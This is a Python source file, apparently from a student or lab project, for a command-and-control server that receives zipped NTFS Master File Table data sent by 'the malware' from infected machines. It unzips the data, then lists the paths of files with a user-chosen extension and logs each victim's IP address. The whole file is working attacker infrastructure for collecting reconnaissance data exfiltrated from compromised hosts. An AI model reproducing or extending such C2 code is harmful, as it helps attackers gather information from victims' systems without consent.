import socket
import zipfile
from MFTFieldsExtractor import MFTFieldsExtractor

"""
****************************************************************************************
 CnCServer - Command and Control Server. a class in charge of operating a server,
 which waits for the MFT data from the malware and every newly arrived MFT, it will map,
 according to the users input of desired file extensions, the paths of files,
 which correspond to the desired file extension.
 Prints to the log, for each file the src IP, a timestamp and a full file path.
***************************************************************************************
"""

# constant TCP values
TCP_IP = '127.0.0.1'
TCP_PORT = 6666
BUFFER_SIZE = 1024


class CnCServer:
    def __init__(self, ip, port, server):
        self.ip = ip
        self.port = port
        self.server = server
        self.connection = None

    def receive_file(self, file_name):
        """
        receive the zip file from the server and write it to file_name
        :param file_name: the name of the file to create
        """
        f = open(file_name, 'wb')  # create the file in a binary format
        while True:
            data = self.connection.recv(BUFFER_SIZE)  # receive a BUFFER_SIZE amount of data
            if not data: break
            f.write(data)
        f.close()
        self.connection.close()

    def server_receiveMFT(self):
        """
        a function in charge of operation the server:
        listen to new requests, receive a new zip file, and unzip it.
        :return:
        target_dir == the directory of the MFT file
        addr[0] == the src ip address
        """
        self.server.bind((self.ip, self.port))
        self.server.listen(1)
        self.connection, addr = self.server.accept()

        zip_file_name = addr[0] + '.zip'
        self.receive_file(zip_file_name)

        target_dir = addr[0] + '_mft'
        unzip(zip_file_name, target_dir)

        return target_dir, addr[0]


def unzip(zip_name, target_dir=""):
    """
    static function - unzip a zip file
    :param zip_name: the name of the zip file contains the MFT file received
    :param target_dir: the directory to extract the MFT file to
    """
    with zipfile.ZipFile(zip_name, 'r') as zip_ref:
        zip_ref.extractall(target_dir)


def create_socket():
    """
    static function - creating a new socket - Low-level networking interface
    """
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


if __name__ == '__main__':
    while True:
        s = CnCServer(TCP_IP, TCP_PORT, create_socket())
        print("\nWaiting for incoming connections...")
        mft_dir, address = s.server_receiveMFT()

        # read the desired file extension from the user
        extension = '.' + raw_input("Enter desired file extension: ")
        filename = mft_dir + "\\MFT.mft"

        # extract the relevant file paths corresponding to the desired extension
        mft_extractor = MFTFieldsExtractor(filename, extension, address)
        mft_extractor.extract_files_from_MFT()
